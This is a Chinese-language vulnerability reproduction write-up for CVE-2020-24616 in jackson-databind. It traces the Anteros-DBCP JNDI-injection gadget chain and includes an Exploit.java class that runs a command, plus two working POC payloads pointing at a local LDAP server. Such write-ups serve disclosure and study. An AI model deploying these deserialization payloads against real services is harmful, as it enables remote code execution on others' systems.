<html><head><meta charset="utf-8" /><style>.pydocx-caps {text-transform:uppercase}.pydocx-center {text-align:center}.pydocx-comment {color:blue}.pydocx-delete {color:red;text-decoration:line-through}.pydocx-hidden {visibility:hidden}.pydocx-insert {color:green}.pydocx-left {text-align:left}.pydocx-list-style-type-cardinalText {list-style-type:decimal}.pydocx-list-style-type-decimal {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedCircle {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedFullstop {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedParen {list-style-type:decimal}.pydocx-list-style-type-decimalZero {list-style-type:decimal-leading-zero}.pydocx-list-style-type-lowerLetter {list-style-type:lower-alpha}.pydocx-list-style-type-lowerRoman {list-style-type:lower-roman}.pydocx-list-style-type-none {list-style-type:none}.pydocx-list-style-type-ordinalText {list-style-type:decimal}.pydocx-list-style-type-upperLetter {list-style-type:upper-alpha}.pydocx-list-style-type-upperRoman {list-style-type:upper-roman}.pydocx-right {text-align:right}.pydocx-small-caps {font-variant:small-caps}.pydocx-strike {text-decoration:line-through}.pydocx-tab {display:inline-block;width:4em}.pydocx-underline {text-decoration:underline}body {margin:0px auto}</style></head><body><h1>（CVE-2020-24616）FasterXML jackson-databind 远程命令执行漏洞</h1><h2>一、漏洞简介</h2><p>br.com.anteros.dbcp.AnterosDBCPConfig类绕过了之前jackson-databind维护的黑名单类，并且JDK版本较低的话，可造成RCE。</p><h3>利用条件</h3><ul><li>开启enableDefaultTyping()</li><li>使用了br.com.anteros第三方依赖</li></ul><h2>二、漏洞影响</h2><p>jackson-databind before 2.9.10.4<br />jackson-databind before 2.8.11.6<br />jackson-databind before 2.7.9.7</p><h2>三、复现过程</h2><h3>漏洞分析</h3><p>相关信息：</p><p>https://github.com/FasterXML/jackson-databind/issues/2814</p><p>1.png</p><p>之后查找对应的issue，找到对应的绕过黑名单类：</p><p>2.png</p><p>之后在源码中定位到br.com.anteros.dbcp.AnterosDBCPDataSource类，可以看到该类继承自AnterosDBCPConfig类：</p><p>3.jpeg</p><p>之后全局搜索healthCheckRegistry发现在函数setHealthCheckRegistry作为参数进行传递，之后该参数被传入了super.setHealthCheckRegistry(healthCheckRegistry);，也就是调用了父类的setHealthCheckRegistry方法，并将此参数作为只传递，下面我们跟进该函数来看看：</p><p>4.jpeg</p><p>在父类的setHealthCheckRegistry方法中首先会判断healthCheckRegistry是否为空，如果不为空则调用当前类的getObjectOrPerformJndiLookup方法并将healthCheckRegistry作为参数传递，下面继续跟踪看看：</p><p>5.jpeg</p><p>之后再getObjectOrPerformJndiLookup方法中可以看到，此处的参数object(即:传入的数据类型healthCheckRegistry的值)首先会判断其数据类型，可以看到数据类型为String时会被带入initCtx.lookup，从而导致JNDI注入：</p><p>6.jpeg</p><p>整个利用链如下所示：</p><p>mapper.readValue<br />    -&gt;AnterosDBCPDataSource.setHealthCheckRegistry<br />        -&gt;AnterosDBCPDataSource.setHealthCheckRegistry<br />            -&gt;AnterosDBCPDataSource.getObjectOrPerformJndiLookup<br />                -&gt;initCtx.lookup();</p><h3>漏洞复现</h3><p>pom.xml如下所示：</p><p>&lt;dependencies&gt;<br />    &lt;dependency&gt;<br />      &lt;groupId&gt;com.fasterxml.jackson.core&lt;/groupId&gt;<br />      &lt;artifactId&gt;jackson-databind&lt;/artifactId&gt;<br />      &lt;version&gt;2.9.10.4&lt;/version&gt;<br />    &lt;/dependency&gt;<br />    &lt;dependency&gt;<br />        &lt;groupId&gt;com.fasterxml.jackson.core&lt;/groupId&gt;<br />        &lt;artifactId&gt;jackson-databind&lt;/artifactId&gt;<br />        &lt;version&gt;2.11.2&lt;/version&gt;<br />    &lt;/dependency&gt;<br />    &lt;dependency&gt;<br />        &lt;groupId&gt;br.com.anteros&lt;/groupId&gt;<br />        &lt;artifactId&gt;Anteros-DBCP&lt;/artifactId&gt;<br />        &lt;version&gt;1.0.1&lt;/version&gt;<br />    &lt;/dependency&gt;<br />    &lt;dependency&gt;<br />      &lt;groupId&gt;org.slf4j&lt;/groupId&gt;<br />      &lt;artifactId&gt;slf4j-nop&lt;/artifactId&gt;<br />      &lt;version&gt;1.7.2&lt;/version&gt;<br />    &lt;/dependency&gt;<br />    &lt;!-- https://mvnrepository.com/artifact/javax.transaction/jta --&gt;<br />      &lt;dependency&gt;<br />          &lt;groupId&gt;javax.transaction&lt;/groupId&gt;<br />          &lt;artifactId&gt;jta&lt;/artifactId&gt;<br />          &lt;version&gt;1.1&lt;/version&gt;<br />      &lt;/dependency&gt;<br />  &lt;/dependencies&gt;</p><h4><em>漏洞利用</em></h4><h5>Exploit.java代码如下：</h5><p>import java.lang.Runtime;<br /><br />public class Exploit {<br />    static {<br />        try {<br />            Runtime.getRuntime().exec("calc");<br />        } catch (Exception e) {<br />            e.printStackTrace();<br />        }<br />    }<br />}</p><p>之后编译Exploit.java，并且使用python启动一个简易的Web服务，将Exploit.class文件放置到web目录下，之后使用<br />marshalsec启动一个LDAP服务：</p><p>7.png</p><h5>执行漏洞POC1:</h5><p>import com.fasterxml.jackson.databind.ObjectMapper;<br /><br />public class POC {<br />    public static void main(String[] args) throws Exception {<br />        String payload = "[\"br.com.anteros.dbcp.AnterosDBCPDataSource\",{\"healthCheckRegistry\":\"ldap://127.0.0.1:1099/Exploit\"}]";<br />        ObjectMapper mapper = new ObjectMapper();<br />        mapper.enableDefaultTyping();<br />        mapper.readValue(payload, Object.class);<br />    }<br />}</p><p>之后运行该程序，成功执行命令，弹出计算器：</p><p>8.jpeg</p><h5>执行漏洞POC2</h5><p>Poc.java代码如下所示：</p><p>import com.fasterxml.jackson.databind.ObjectMapper;<br /><br />public class POC {<br />    public static void main(String[] args) throws Exception {<br />        String payload = "[\"br.com.anteros.dbcp.AnterosDBCPDataSource\",{\"metricRegistry\":\"ldap://127.0.0.1:1099/Exploit\"}]";<br />        ObjectMapper mapper = new ObjectMapper();<br />        mapper.enableDefaultTyping();<br />        mapper.readValue(payload, Object.class);<br />    }<br />}</p><p>之后运行该程序，成功执行命令，弹出计算器：</p><p>9.jpeg</p><h2>参考链接</h2><p>https://xz.aliyun.com/t/8210</p></body></html>